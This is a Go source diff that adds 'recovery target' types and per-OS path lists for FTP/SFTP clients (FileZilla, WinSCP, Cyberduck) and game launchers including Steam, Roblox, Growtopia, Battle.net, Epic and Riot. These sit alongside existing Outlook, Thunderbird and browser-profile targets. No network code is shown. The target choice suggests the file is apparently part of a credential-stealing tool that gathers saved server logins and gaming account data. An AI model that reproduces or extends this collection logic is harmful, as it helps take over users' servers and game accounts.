@@ -107,6 +107,30 @@ func defaultLabelFor(typ string) string {
 		return "outlook-data"
 	case "thunderbird-data":
 		return "thunderbird-data"
+	case "cyberduck-data":
+		return "cyberduck-data"
+	case "filezilla-data":
+		return "filezilla-data"
+	case "winscp-data":
+		return "winscp-data"
+	case "growtopia-data":
+		return "growtopia-data"
+	case "roblox-data":
+		return "roblox-data"
+	case "battlenet-data":
+		return "battlenet-data"
+	case "ea-app-data":
+		return "ea-app-data"
+	case "epic-games-data":
+		return "epic-games-data"
+	case "steam-data":
+		return "steam-data"
+	case "ubisoft-connect-data":
+		return "ubisoft-connect-data"
+	case "gog-galaxy-data":
+		return "gog-galaxy-data"
+	case "riot-client-data":
+		return "riot-client-data"
 	default:
 		return "target"
 	}
@@ -183,6 +207,30 @@ func resolveSelectionPaths(selection protocol.RecoveryTargetSelection) []string 
 		return outlookDataPaths()
 	case "thunderbird-data":
 		return thunderbirdDataPaths()
+	case "cyberduck-data":
+		return cyberduckDataPaths()
+	case "filezilla-data":
+		return filezillaDataPaths()
+	case "winscp-data":
+		return winscpDataPaths()
+	case "growtopia-data":
+		return growtopiaDataPaths()
+	case "roblox-data":
+		return robloxDataPaths()
+	case "battlenet-data":
+		return battleNetDataPaths()
+	case "ea-app-data":
+		return eaAppDataPaths()
+	case "epic-games-data":
+		return epicGamesDataPaths()
+	case "steam-data":
+		return steamDataPaths()
+	case "ubisoft-connect-data":
+		return ubisoftConnectDataPaths()
+	case "gog-galaxy-data":
+		return gogGalaxyDataPaths()
+	case "riot-client-data":
+		return riotClientDataPaths()
 	case "custom-path":
 		paths := make([]string, 0, len(selection.Paths)+1)
 		if strings.TrimSpace(selection.Path) != "" {
@@ -1270,6 +1318,654 @@ func outlookDataPaths() []string {
 func thunderbirdDataPaths() []string {
 	roots := thunderbirdRoots()
 	return collectProfileDirs(roots, true)
+}
+
+func cyberduckDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "Cyberduck"))
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths,
+				filepath.Join(localAppData, "Cyberduck"),
+				filepath.Join(localAppData, "iterate GmbH", "Cyberduck"),
+			)
+		}
+		if programData := os.Getenv("PROGRAMDATA"); programData != "" {
+			paths = append(paths, filepath.Join(programData, "Cyberduck"))
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			group := filepath.Join(home, "Library", "Group Containers", "G69SCX94XU.duck")
+			paths = append(paths,
+				filepath.Join(support, "Cyberduck"),
+				filepath.Join(group, "Library", "Application Support", "duck"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "Cyberduck"),
+				filepath.Join(home, ".config", "cyberduck"),
+				filepath.Join(home, ".local", "share", "Cyberduck"),
+				filepath.Join(home, ".local", "share", "cyberduck"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths,
+				filepath.Join(config, "Cyberduck"),
+				filepath.Join(config, "cyberduck"),
+			)
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths,
+				filepath.Join(dataHome, "Cyberduck"),
+				filepath.Join(dataHome, "cyberduck"),
+			)
+		}
+	}
+	return paths
+}
+
+func filezillaDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "FileZilla"),
+				filepath.Join(appData, "filezilla"),
+			)
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths,
+				filepath.Join(localAppData, "FileZilla"),
+				filepath.Join(localAppData, "filezilla"),
+			)
+		}
+		if programData := os.Getenv("PROGRAMDATA"); programData != "" {
+			paths = append(paths,
+				filepath.Join(programData, "FileZilla"),
+				filepath.Join(programData, "filezilla"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths, filepath.Join(support, "FileZilla"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "filezilla"),
+				filepath.Join(home, ".local", "share", "filezilla"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "filezilla"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "filezilla"))
+		}
+	}
+	return paths
+}
+
+func winscpDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	if runtime.GOOS == "windows" {
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "WinSCP"))
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "WinSCP"))
+		}
+		if documents := os.Getenv("USERPROFILE"); documents != "" {
+			paths = append(paths, filepath.Join(documents, "Documents", "WinSCP"))
+		} else if home != "" {
+			paths = append(paths, filepath.Join(home, "Documents", "WinSCP"))
+		}
+		if programData := os.Getenv("PROGRAMDATA"); programData != "" {
+			paths = append(paths, filepath.Join(programData, "WinSCP"))
+		}
+	}
+	return paths
+}
+
+func growtopiaDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "Growtopia"))
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "Growtopia"))
+		}
+		documents := os.Getenv("USERPROFILE")
+		if documents == "" {
+			documents = home
+		}
+		if documents != "" {
+			paths = append(paths, filepath.Join(documents, "Documents", "Growtopia"))
+		}
+	case "darwin":
+		if home != "" {
+			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Growtopia"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "Growtopia"),
+				filepath.Join(home, ".local", "share", "Growtopia"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "Growtopia"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "Growtopia"))
+		}
+	}
+	return paths
+}
+
+func robloxDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths,
+				filepath.Join(localAppData, "Roblox"),
+				filepath.Join(localAppData, "Packages", "ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr"),
+				filepath.Join(localAppData, "Packages", "ROBLOXCORPORATION.ROBLOX"),
+			)
+		}
+		documents := os.Getenv("USERPROFILE")
+		if documents == "" {
+			documents = home
+		}
+		if documents != "" {
+			paths = append(paths, filepath.Join(documents, "Documents", "Roblox"))
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "Roblox"))
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "Roblox"),
+				filepath.Join(home, "Library", "Caches", "com.roblox.Roblox"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "Roblox"),
+				filepath.Join(home, ".local", "share", "Roblox"),
+				filepath.Join(home, ".local", "share", "roblox"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "Roblox"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "Roblox"))
+		}
+	}
+	return paths
+}
+
+func battleNetDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths,
+				filepath.Join(programData, "Battle.net"),
+				filepath.Join(programData, "Blizzard Entertainment"),
+			)
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "Battle.net"),
+				filepath.Join(appData, "Blizzard Entertainment", "Battle.net"),
+			)
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths,
+				filepath.Join(localAppData, "Battle.net"),
+				filepath.Join(localAppData, "Blizzard Entertainment", "Battle.net"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "Battle.net"),
+				filepath.Join(support, "Blizzard", "Battle.net"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".battle.net"),
+				filepath.Join(home, ".local", "share", "Battle.net"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "Battle.net"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "Battle.net"))
+		}
+	}
+	return paths
+}
+
+func eaAppDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths,
+				filepath.Join(programData, "EA Desktop"),
+				filepath.Join(programData, "Electronic Arts", "EA Desktop"),
+				filepath.Join(programData, "Origin"),
+			)
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "EA Desktop"),
+				filepath.Join(appData, "Electronic Arts", "EA Desktop"),
+				filepath.Join(appData, "Origin"),
+			)
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths,
+				filepath.Join(localAppData, "EA Desktop"),
+				filepath.Join(localAppData, "Electronic Arts", "EA Desktop"),
+				filepath.Join(localAppData, "Origin"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "Origin"),
+				filepath.Join(support, "EA Desktop"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "Origin"),
+				filepath.Join(home, ".local", "share", "Origin"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths,
+				filepath.Join(config, "Origin"),
+				filepath.Join(config, "ea-desktop"),
+			)
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths,
+				filepath.Join(dataHome, "Origin"),
+				filepath.Join(dataHome, "EA Desktop"),
+			)
+		}
+	}
+	return paths
+}
+
+func epicGamesDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths,
+				filepath.Join(programData, "Epic"),
+				filepath.Join(programData, "Epic", "EpicGamesLauncher"),
+			)
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths,
+				filepath.Join(localAppData, "EpicGamesLauncher"),
+				filepath.Join(localAppData, "Epic"),
+				filepath.Join(localAppData, "EpicGamesLauncher", "Saved"),
+			)
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "Epic"),
+				filepath.Join(appData, "Epic Games"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "Epic"),
+				filepath.Join(support, "EpicGamesLauncher"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "Epic"),
+				filepath.Join(home, ".config", "EpicGamesLauncher"),
+				filepath.Join(home, ".local", "share", "Epic"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths,
+				filepath.Join(config, "Epic"),
+				filepath.Join(config, "EpicGamesLauncher"),
+			)
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "Epic"))
+		}
+	}
+	return paths
+}
+
+func steamDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		programFiles := os.Getenv("PROGRAMFILES(X86)")
+		if programFiles == "" {
+			programFiles = os.Getenv("PROGRAMFILES")
+		}
+		if programFiles != "" {
+			paths = append(paths, filepath.Join(programFiles, "Steam"))
+		} else {
+			paths = append(paths, filepath.Join("C:\\", "Program Files (x86)", "Steam"))
+		}
+		if alt := os.Getenv("PROGRAMFILES"); alt != "" && alt != programFiles {
+			paths = append(paths, filepath.Join(alt, "Steam"))
+		}
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths, filepath.Join(programData, "Steam"))
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "Steam"))
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "Steam"))
+		}
+	case "darwin":
+		if home != "" {
+			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Steam"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".steam"),
+				filepath.Join(home, ".steam", "steam"),
+				filepath.Join(home, ".local", "share", "Steam"),
+			)
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths,
+				filepath.Join(dataHome, "Steam"),
+				filepath.Join(dataHome, "steam"),
+			)
+		}
+		if home != "" {
+			paths = append(paths, filepath.Join(home, ".var", "app", "com.valvesoftware.Steam"))
+		}
+	}
+	return paths
+}
+
+func ubisoftConnectDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		programFiles := os.Getenv("PROGRAMFILES(X86)")
+		if programFiles == "" {
+			programFiles = os.Getenv("PROGRAMFILES")
+		}
+		if programFiles != "" {
+			paths = append(paths, filepath.Join(programFiles, "Ubisoft", "Ubisoft Game Launcher"))
+		}
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths, filepath.Join(programData, "Ubisoft", "Ubisoft Game Launcher"))
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "Ubisoft Game Launcher"))
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "Ubisoft Game Launcher"))
+		}
+	case "darwin":
+		if home != "" {
+			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Ubisoft Game Launcher"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".local", "share", "Ubisoft Game Launcher"),
+				filepath.Join(home, ".config", "Ubisoft Game Launcher"),
+			)
+		}
+	}
+	return paths
+}
+
+func gogGalaxyDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		programFiles := os.Getenv("PROGRAMFILES(X86)")
+		if programFiles == "" {
+			programFiles = os.Getenv("PROGRAMFILES")
+		}
+		if programFiles != "" {
+			paths = append(paths,
+				filepath.Join(programFiles, "GOG Galaxy"),
+				filepath.Join(programFiles, "GOG.com", "Galaxy"),
+			)
+		}
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths, filepath.Join(programData, "GOG.com", "Galaxy"))
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "GOG.com", "Galaxy"),
+				filepath.Join(appData, "GOG Galaxy"),
+			)
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "GOG.com", "Galaxy"))
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support", "GOG.com")
+			paths = append(paths,
+				filepath.Join(support, "Galaxy"),
+				filepath.Join(home, "Library", "Application Support", "GOG Galaxy"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "GOG.com", "Galaxy"),
+				filepath.Join(home, ".local", "share", "GOG.com", "Galaxy"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "GOG.com", "Galaxy"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "GOG.com", "Galaxy"))
+		}
+	}
+	return paths
+}
+
+func riotClientDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		programFiles := os.Getenv("PROGRAMFILES")
+		if programFiles != "" {
+			paths = append(paths, filepath.Join(programFiles, "Riot Games"))
+		}
+		programFilesX86 := os.Getenv("PROGRAMFILES(X86)")
+		if programFilesX86 != "" && programFilesX86 != programFiles {
+			paths = append(paths, filepath.Join(programFilesX86, "Riot Games"))
+		}
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths, filepath.Join(programData, "Riot Games"))
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "Riot Games"))
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "Riot Games"))
+		}
+	case "darwin":
+		if home != "" {
+			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Riot Games"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "Riot Games"),
+				filepath.Join(home, ".local", "share", "Riot Games"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "Riot Games"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "Riot Games"))
+		}
+	}
+	return paths
 }
 
 func geckoProfileDirs() []string {
